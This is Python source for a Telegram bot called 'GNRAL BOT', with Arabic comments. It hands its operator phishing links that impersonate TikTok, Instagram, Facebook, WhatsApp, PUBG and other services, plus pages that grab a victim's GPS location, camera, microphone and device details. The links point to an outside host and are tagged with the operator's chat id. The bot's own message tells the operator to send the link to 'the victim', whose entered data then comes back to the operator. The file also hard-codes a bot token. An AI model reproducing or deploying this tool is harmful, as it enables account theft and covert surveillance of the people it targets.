import os, sys, subprocess, logging

# ========== تثبيت تلقائي للمكتبات ==========
def ensure_module(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])

ensure_module("flask")
ensure_module("requests")
ensure_module("pyTelegramBotAPI", "telebot")

from flask import Flask, request
from telebot import TeleBot, types

# ========== الإعدادات ==========
TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"   # رابط استضافة الصفحات
APP_URL = "https://gamee-beqx.onrender.com"           # رابط تطبيقك على Render

logging.basicConfig(level=logging.INFO)
bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

# ========== الصفحات (17 زر بالضبط) ==========
PAGES = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")   # الزر الأخير (سيظهر عريضًا)
]

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            json_string = request.get_data().decode('utf-8')
            update = types.Update.de_json(json_string)
            bot.process_new_updates([update])
            return ''
        except Exception as e:
            logging.error(f"Webhook error: {e}")
            return ''
    return '!', 403

# ========== أمر /start ==========
@bot.message_handler(commands=['start'])
def start(msg):
    chat_id = msg.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)

    # إضافة الأزواج (8 أزواج = 16 زر)
    for i in range(0, len(PAGES) - 1, 2):
        left = PAGES[i]
        right = PAGES[i+1]
        markup.row(
            types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
        )

    # الزر الأخير (فحص الجهاز) بمفرده ليكون عريضًا
    last = PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))

    welcome_text = """🔱 <b>GNRAL BOT</b>

🟢 <b>نسبة النجاح:</b> 95%
🔄 <b>بروكسيات:</b> 9626
❤️ <b>الحالة:</b> جاهز

اختر المنصة:"""

    bot.send_message(chat_id, welcome_text, reply_markup=markup, parse_mode="HTML")

# ========== الضغط على أي صفحة ==========
@bot.callback_query_handler(func=lambda call: call.data.startswith("ph|"))
def handle_phishing(call):
    chat_id = call.message.chat.id
    page = call.data.split("|")[1]
    link = f"{BASE_URL}/{page}?chat={chat_id}"

    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))

    bot.edit_message_text(
        f"🔗 رابط الصفحة:\n<code>{link}</code>\n\nأرسل هذا الرابط للضحية. عند إدخال بياناته ستصل إليك هنا.",
        chat_id,
        call.message.message_id,
        parse_mode="HTML",
        reply_markup=markup
    )
    bot.answer_callback_query(call.id)

# ========== زر الرجوع ==========
@bot.callback_query_handler(func=lambda call: call.data == "back")
def handle_back(call):
    chat_id = call.message.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)

    for i in range(0, len(PAGES) - 1, 2):
        left = PAGES[i]
        right = PAGES[i+1]
        markup.row(
            types.InlineKeyboardButton(left[0], callback_data=f"ph|{left[1]}"),
            types.InlineKeyboardButton(right[0], callback_data=f"ph|{right[1]}")
        )

    last = PAGES[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))

    welcome_text = """🔱 <b>GNRAL BOT</b>

🟢 <b>نسبة النجاح:</b> 95%
🔄 <b>بروكسيات:</b> 9626
❤️ <b>الحالة:</b> جاهز

اختر المنصة:"""

    bot.edit_message_text(welcome_text, chat_id, call.message.message_id, parse_mode="HTML", reply_markup=markup)
    bot.answer_callback_query(call.id)

# ========== تشغيل ==========
if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    PORT = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=PORT)